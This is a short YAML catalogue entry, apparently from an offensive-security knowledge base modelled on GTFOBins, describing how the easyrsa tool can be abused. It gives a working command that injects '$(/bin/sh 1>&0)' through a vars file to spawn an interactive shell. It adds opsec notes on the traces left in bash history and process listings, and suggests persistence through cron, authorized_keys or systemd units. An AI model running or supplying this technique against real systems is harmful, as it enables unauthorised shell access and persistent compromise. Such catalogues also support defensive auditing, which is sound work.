---
name: easyrsa
capabilities:
- exec
- spawn
required_permissions:
  level: user
difficulty: low
opsec:
  noise: medium
  artifacts:
  - ~/.bash_history
  - Process arguments visible in ps and auditd
  notes: ''
persistence_potential: true
examples:
- id: shell
  description: Spawn an interactive shell.
  capabilities:
  - spawn
  - exec
  command: |-
    echo 'set_var X "$(/bin/sh 1>&0)"' >/path/to/temp-file
    easyrsa --vars=/path/to/temp-file
  notes: This command might not be in the `PATH`, it could be found in, `/usr/share/easy-rsa/easyrsa`. The shell is spawn twice.
references:
- https://gtfobins.github.io/gtfobins/easyrsa/
tags: []
persistence_notes: Combine with write/exec primitives to drop cron entries, authorized_keys, or systemd units.
---
